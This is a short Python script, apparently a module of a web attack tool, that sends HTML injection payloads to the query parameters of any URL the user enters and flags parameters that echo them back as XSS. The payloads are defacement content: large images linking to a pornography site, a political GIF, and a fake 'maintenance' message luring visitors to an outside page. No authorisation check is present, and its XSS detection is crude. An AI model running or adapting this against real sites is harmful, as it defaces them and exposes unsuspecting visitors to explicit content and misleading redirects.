import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

def guess_params(params):
    if not params:
        common_params = ['id', 'page', 'user', 'search', 'q',
        'searchTerm']
        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running XSS scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [
        '<a href="https://www.pornhub.com" target="_blank"><img src="https://el.phncdn.com/gif/45467111.gif" alt="STUPID"width="900" height="450"></a>',
        '<a href="https://www.pornhub.com" target="_blank"><img src="https://media1.tenor.com/m/sLjUbG5BVikAAAAd/trump-dance-trump-2024.gif" alt="STUPID"width="900" height="450"></a>',
        '<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc"><img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!"></a>'
    ]

    vulnerable_params = []

    for param in params:
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                res = requests.get(test_url, timeout=5)
                if payload in res.text:
                    print(Fore.RED + f"[!] XSS vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] {e}")
        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No XSS detected in parameter: {param}")

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for XSS.")
